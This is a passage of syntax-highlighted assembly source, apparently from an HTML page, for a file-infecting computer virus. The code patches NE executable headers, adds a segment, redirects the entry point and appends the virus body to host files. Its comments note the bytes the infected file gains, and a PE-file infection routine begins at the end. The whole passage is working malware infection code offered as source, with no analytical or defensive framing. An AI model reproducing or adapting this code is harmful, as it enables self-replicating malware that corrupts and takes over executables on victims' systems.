                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">                      </span><span class="sc1">; Now go for the rest</span><span class="sc0">

</span><span class="sc5">update_ptrs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Pointer below AX?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">dont_add</span><span class="sc0">                    </span><span class="sc1">; Don't add 8 to it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; Update the pointer</span><span class="sc0">
</span><span class="sc5">dont_add</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; I know i could have</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; optimized this, but</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">update_ptrs</span><span class="sc0">                 </span><span class="sc1">; who cares :P</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; Pop SI from stack</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX -&gt; segment counter</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Increment counter</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; CX = DX = 8</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                                 </span><span class="sc1">; Now set DX to 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">37h</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; EXE flags = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Kill gangload area</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ah</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; for compatibility</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; Multiply AX*CX</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Ptr to segment table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                     </span><span class="sc1">; CX -&gt; page size</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; Add with carry to DX</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; Divide the length</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Move to newexe_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Move to last_newexe</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newexe_entry</span><span class="sc0">      </span><span class="sc1">; Offset of the NE entry</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_ne_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store old NE IP</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Nr.of segments in NE</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_ne_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store old NE CS</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">32h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file alignment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; shift count in AL</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Offset of NE header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; in AX and lseek_newexe</span><span class="sc0">

</span><span class="sc5">move_forward</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get newexe_size value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; in AX and check if it</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">last_page</span><span class="sc0">                   </span><span class="sc1">; is equal to zero</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Decrement newexe_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Now lseek to [3ch]-8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">; in order to shift the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">                </span><span class="sc1">; required objects</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Write one page which</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                     </span><span class="sc1">; contains the NE header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; in [3ch]-8 in order to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; shift the 1st object</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; CX -&gt; one page size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Now lseek to the end</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">                </span><span class="sc1">; of the *new* NE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read a new page from</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; current offset to our</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; buffer, pointed both</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; by DS:DX and DS:SI</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">move_forward</span><span class="sc0">                </span><span class="sc1">; And go shift it</span><span class="sc0">
</span><span class="sc5">last_page</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_end</span><span class="sc0">                   </span><span class="sc1">; Lseek to the bottom</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get align_shift in CL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; Push file handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; And now shift segment</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">; offset by segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; alignment (shl -&gt; CX)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; Pop file handle</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; And divide AX:CX</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set lseek_add = 0</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; Is DX also zero?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_extra</span><span class="sc0">                    </span><span class="sc1">; Yes, no extra page</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; Substract DX from CX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Move it to lseek_add</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; And increment AX</span><span class="sc0">

</span><span class="sc5">no_extra</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">; Push DI onto stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                        </span><span class="sc1">; Now DS:SI = DS:DI</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_newexe</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DS:DI+last_newexe</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; Segment offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">espo_file_size</span><span class="sc0"> </span><span class="sc1">; Segment size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">180h</span><span class="sc0">           </span><span class="sc1">; Segment attribs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc5">espo_file_size</span><span class="sc4">+</span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc1">; Bytes to</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                                     </span><span class="sc1">; allocate</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Lseek to the offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">; where we have to</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">                </span><span class="sc1">; write this last page</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Write it in, its</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; size is specified</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">; in (last_newexe)+8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; Point to the buffer</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; And do it :P</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; Set the NewEXE IP</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">newexe_ip</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; to zero, exchange it</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; and push old value</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; And now set the</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; NewEXE CS to 0ffffh</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">newexe_cs</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; And push it for l8r</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                    </span><span class="sc1">; Lseek to our final</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; destination place</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; in the NewEXE file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; And append our virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">           </span><span class="sc1">; body to it... now</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">espo_start</span><span class="sc0">               </span><span class="sc1">; it has grown 4733</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; charming bytes :P</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">newexe_cs</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Restore relocation</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">newexe_ip</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; pointers for CS:IP</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; And write the cool</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">reloc_size</span><span class="sc0">               </span><span class="sc1">; relocation item :)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">reloc_start</span><span class="sc0">              </span><span class="sc1">; Now the file is</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; 4743 bytes bigger!</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">                     </span><span class="sc1">; Close it and exit</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ PE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check_pe</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to the start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; of the file and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">; read again the first</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; 41h bytes of the MZ</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; header to rebuild it</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to start again</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; Update the pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; to the new EXE header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; by readding 8 to it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; and write the MZ</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; header back</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Now lseek to the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">                </span><span class="sc1">; PE header (in [3ch])</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read one page from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                     </span><span class="sc1">; it to our buffer</span><span class="sc0">
